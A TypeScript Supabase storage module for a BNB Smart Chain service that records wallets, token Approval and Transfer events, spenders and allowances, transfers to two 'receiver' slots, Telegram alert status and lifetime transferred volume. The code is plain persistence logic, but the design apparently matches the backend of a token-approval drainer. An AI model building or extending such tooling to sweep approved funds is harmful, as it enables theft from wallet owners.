import { createClient, type SupabaseClient } from "@supabase/supabase-js";
import { config } from "./config";

export type WalletRecord = {
  address: string;
  receiver: 1 | 2;
  active: boolean;
  createdAt: string;
  updatedAt?: string;
  firstDetectedAt?: string;
  latestActivityAt?: string;
  lastCheckedAt?: string;
  lastError?: string;
  approvalLinked?: boolean;
  tokenContract?: string;
  tokenSymbol?: string;
  tokenDecimals?: number;
  network?: string;
  chainId?: string;
  currentBalance?: string;
  currentAllowance?: string;
  spender?: string;
  latestApprovalTxHash?: string;
  latestTransferTxHash?: string;
};

export type ApprovalRecord = {
  id: string;
  walletAddress: string;
  ownerAddress: string;
  spender: string;
  tokenContract: string;
  tokenSymbol: string;
  tokenDecimals: number;
  approvalAmount: string;
  rawApprovalAmount: string;
  network: string;
  chainId: string;
  blockNumber: number;
  blockTimestamp: string;
  transactionHash: string;
  logIndex: number;
  eventType: "Approval";
  processingStatus: "pending" | "processed" | "failed";
  telegramStatus: "pending" | "sent" | "failed" | "skipped";
  telegramAttemptCount: number;
  telegramSentAt?: string;
  telegramError?: string;
  createdAt: string;
  updatedAt: string;
};

export type TransferRecord = {
  id: string;
  walletAddress: string;
  sender: string;
  receivingWallet: string;
  tokenContract: string;
  tokenSymbol: string;
  tokenDecimals: number;
  transferAmount: string;
  rawTransferAmount: string;
  currentBalance?: string;
  network: string;
  chainId: string;
  blockNumber: number;
  blockTimestamp: string;
  transactionHash: string;
  logIndex: number;
  eventType: "Transfer";
  processingStatus: "pending" | "processed" | "failed";
  telegramStatus: "pending" | "sent" | "failed" | "skipped";
  telegramAttemptCount: number;
  telegramSentAt?: string;
  telegramError?: string;
  createdAt: string;
  updatedAt: string;
};

export type MonitoringState = {
  network: string;
  chainId: number;
  contractAddress: string;
  eventType: string;
  lastProcessedBlock: number;
  updatedAt: string;
};

export type HistoryRecord = {
  id: string;
  wallet: string;
  receiver: 1 | 2;
  amount: string;
  txHash?: string;
  status: "submitted" | "confirmed" | "failed";
  error?: string;
  createdAt: string;
};

type SupabaseRow<T> = { id: string; record: T; created_at: string };

const defaultMonitoringState: MonitoringState = {
  network: "BNB Smart Chain",
  chainId: 56,
  contractAddress: "0x0000000000000000000000000000000000000000",
  eventType: "Approval+Transfer",
  lastProcessedBlock: 0,
  updatedAt: new Date(0).toISOString()
};

export class Store {
  private readonly client: SupabaseClient;
  private wallets: WalletRecord[] = [];
  private historyRecords: HistoryRecord[] = [];
  private approvalEvents: ApprovalRecord[] = [];
  private transferEvents: TransferRecord[] = [];
  private monitoringStates: MonitoringState[] = [];
  private lifetimeTransferredAmount = "0";
  private lifetimeTransferredDecimals = 6;

  constructor() {
    this.client = createClient(config.SUPABASE_URL, config.SUPABASE_SERVICE_ROLE_KEY, {
      auth: { autoRefreshToken: false, persistSession: false }
    });
  }

  async initialize() {
    const [wallets, history, approvals, transfers, monitoringStates] = await Promise.all([
      this.load<WalletRecord>("wallets", 10000, true),
      this.load<HistoryRecord>("history", 1000),
      this.load<ApprovalRecord>("approvalEvents", 2000),
      this.load<TransferRecord>("transferEvents", 2000),
      this.load<MonitoringState>("monitoringState", 100, true)
    ]);
    this.wallets = wallets;
    this.historyRecords = history;
    this.approvalEvents = approvals;
    this.transferEvents = transfers;
    this.monitoringStates = monitoringStates;

    const { data: lifetimeTransferredAmount, error } = await this.client
      .rpc("reconcile_lifetime_transfer_volume")
      .returns<string>();
    if (error) throw new Error(`Supabase transfer volume reconciliation failed: ${error.message}`);
    if (typeof lifetimeTransferredAmount !== "string" || !/^\d+$/.test(lifetimeTransferredAmount)) {
      throw new Error("Supabase returned an invalid lifetime transfer volume");
    }
    this.lifetimeTransferredAmount = lifetimeTransferredAmount;
  }

  private async load<T>(table: string, limit: number, ascending = false): Promise<T[]> {
    const records: T[] = [];
    const pageSize = 1000;
    for (let offset = 0; offset < limit; offset += pageSize) {
      const end = Math.min(offset + pageSize, limit) - 1;
      const { data, error } = await this.client
        .from(table)
        .select("id,record,created_at")
        .order("created_at", { ascending })
        .order("id", { ascending: true })
        .range(offset, end)
        .returns<SupabaseRow<T>[]>();
      if (error) throw new Error(`Supabase read failed for ${table}: ${error.message}`);
      records.push(...data.map((row) => row.record));
      if (data.length < end - offset + 1) break;
    }
    return records;
  }

  private async persist<T>(table: string, id: string, record: T, createdAt: string) {
    const { error } = await this.client
      .from(table)
      .upsert({ id, record, created_at: createdAt }, { onConflict: "id" });
    if (error) throw new Error(`Supabase write failed for ${table}: ${error.message}`);
  }

  private normalizeAddress(address: string) {
    return address.toLowerCase();
  }

  listWallets() { return this.wallets; }
  listApprovalLinkedWallets() { return this.wallets.filter((wallet) => wallet.approvalLinked && wallet.active); }
  listApprovalEvents() { return this.approvalEvents; }
  listTransferEvents() { return this.transferEvents; }
  getLifetimeTransferredAmount() { return this.lifetimeTransferredAmount; }
  getLifetimeTransferredDecimals() { return this.lifetimeTransferredDecimals; }
  setLifetimeTransferredDecimals(decimals: number) {
    if (!Number.isInteger(decimals) || decimals < 0 || decimals > 36) {
      throw new Error("Token decimals must be an integer between 0 and 36");
    }
    this.lifetimeTransferredDecimals = decimals;
  }
  getWallet(address: string) {
    return this.wallets.find((wallet) => this.normalizeAddress(wallet.address) === this.normalizeAddress(address));
  }
  getApprovalEvent(id: string) { return this.approvalEvents.find((record) => record.id === id); }
  getTransferEvent(id: string) { return this.transferEvents.find((record) => record.id === id); }

  async register(wallet: WalletRecord) {
    await this.persist("wallets", this.normalizeAddress(wallet.address), wallet, wallet.createdAt);
    this.wallets = this.wallets.filter((item) => this.normalizeAddress(item.address) !== this.normalizeAddress(wallet.address));
    this.wallets.push(wallet);
    return wallet;
  }

  async remove(address: string) {
    const wallet = this.getWallet(address);
    if (!wallet) return undefined;
    const updated = { ...wallet, active: false, updatedAt: new Date().toISOString() };
    await this.persist("wallets", this.normalizeAddress(updated.address), updated, updated.createdAt);
    this.wallets = this.wallets.map((item) =>
      this.normalizeAddress(item.address) === this.normalizeAddress(address) ? updated : item
    );
    return updated;
  }

  async update(address: string, update: Partial<WalletRecord>) {
    const wallet = this.getWallet(address);
    if (!wallet) return undefined;
    const updated = { ...wallet, ...update, updatedAt: new Date().toISOString() };
    await this.persist("wallets", this.normalizeAddress(updated.address), updated, updated.createdAt);
    this.wallets = this.wallets.map((item) =>
      this.normalizeAddress(item.address) === this.normalizeAddress(address) ? updated : item
    );
    return updated;
  }

  async addHistory(record: HistoryRecord) {
    await this.persist("history", record.id, record, record.createdAt);
    this.historyRecords = [record, ...this.historyRecords.filter((item) => item.id !== record.id)].slice(0, 1000);
    return record;
  }

  async incrementLifetimeTransferredAmount(transferId: string, rawAmount: string) {
    if (!/^[1-9]\d*$/.test(rawAmount)) {
      throw new Error("Lifetime transfer volume increment must be a positive integer");
    }
    const { data, error } = await this.client
      .rpc("increment_lifetime_transfer_volume", {
        p_transfer_id: transferId,
        p_raw_amount: rawAmount
      })
      .returns<string>();
    if (error) throw new Error(`Supabase transfer volume increment failed: ${error.message}`);
    if (typeof data !== "string" || !/^\d+$/.test(data)) {
      throw new Error("Supabase returned an invalid lifetime transfer volume");
    }
    this.lifetimeTransferredAmount = data;
    return data;
  }

  history(wallet?: string) {
    return wallet
      ? this.historyRecords.filter((item) => this.normalizeAddress(item.wallet) === this.normalizeAddress(wallet))
      : this.historyRecords;
  }

  async upsertApproval(record: ApprovalRecord) {
    await this.persist("approvalEvents", record.id, record, record.createdAt);
    this.approvalEvents = [record, ...this.approvalEvents.filter((item) => item.id !== record.id)].slice(0, 2000);
    return record;
  }

  async upsertTransfer(record: TransferRecord) {
    await this.persist("transferEvents", record.id, record, record.createdAt);
    this.transferEvents = [record, ...this.transferEvents.filter((item) => item.id !== record.id)].slice(0, 2000);
    return record;
  }

  getMonitoringState(eventType: string) {
    return this.monitoringStates.find((state) => state.eventType === eventType) ?? { ...defaultMonitoringState };
  }

  async setMonitoringState(state: MonitoringState) {
    await this.persist("monitoringState", state.eventType, state, state.updatedAt);
    this.monitoringStates = [
      state,
      ...this.monitoringStates.filter((entry) => entry.eventType !== state.eventType)
    ];
    return state;
  }
}
